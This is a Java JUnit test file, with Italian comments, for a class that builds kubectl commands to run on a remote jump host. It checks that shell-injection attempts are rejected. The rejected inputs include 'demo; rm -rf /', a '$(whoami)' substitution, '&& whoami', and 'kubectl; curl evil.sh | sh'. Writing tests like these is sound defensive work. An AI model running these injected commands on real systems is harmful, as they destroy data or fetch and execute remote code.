package io.kubastion.kubectl;

import io.kubastion.config.KubastionProperties;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Queste stringhe finiscono dentro una shell remota. La validazione non e'
 * pignoleria: e' l'unica cosa che separa un file di configurazione da
 * un'esecuzione arbitraria di comandi sul jump host.
 */
class KubectlCommandsTest {

    private KubectlCommands commands(String binary, String namespace, String context) {
        return new KubectlCommands(new KubastionProperties(
                new KubastionProperties.Terminal("", List.of()),
                new KubastionProperties.Kubectl(binary, namespace, context),
                new KubastionProperties.Monitor(3, 15)));
    }

    @Test
    void costruisceIlComandoConIlNamespace() {
        String command = commands("kubectl", "produzione", "").getPods();

        assertEquals("kubectl -n produzione get pods -o json", command);
    }

    @Test
    void includeIlContestoQuandoImpostato() {
        String command = commands("kubectl", "demo", "cluster-a").getPods();

        assertTrue(command.contains("--context=cluster-a"), command);
    }

    @Test
    void omettereIlContestoNonLasciaFlagVuoti() {
        String command = commands("kubectl", "demo", "  ").getPods();

        assertTrue(!command.contains("--context"), command);
    }

    @Test
    void accettaUnPercorsoCompletoPerIlBinario() {
        String command = commands("/usr/local/bin/kubectl", "demo", "").getPods();

        assertTrue(command.startsWith("/usr/local/bin/kubectl "), command);
    }

    @Test
    void rifiutaUnNamespaceCheProvaAIniettareComandi() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl", "demo; rm -rf /", ""));
    }

    @Test
    void rifiutaUnNamespaceConSpazi() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl", "demo prod", ""));
    }

    @Test
    void rifiutaUnNamespaceConApici() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl", "demo\"$(whoami)\"", ""));
    }

    @Test
    void rifiutaUnBinarioConMetacaratteriDiShell() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl; curl evil.sh | sh", "demo", ""));
    }

    @Test
    void rifiutaValoriMancanti() {
        assertThrows(IllegalArgumentException.class, () -> commands("kubectl", "", ""));
        assertThrows(IllegalArgumentException.class, () -> commands("", "demo", ""));
    }

    @Test
    void rifiutaUnContestoNonValido() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl", "demo", "ctx && whoami"));
    }
}
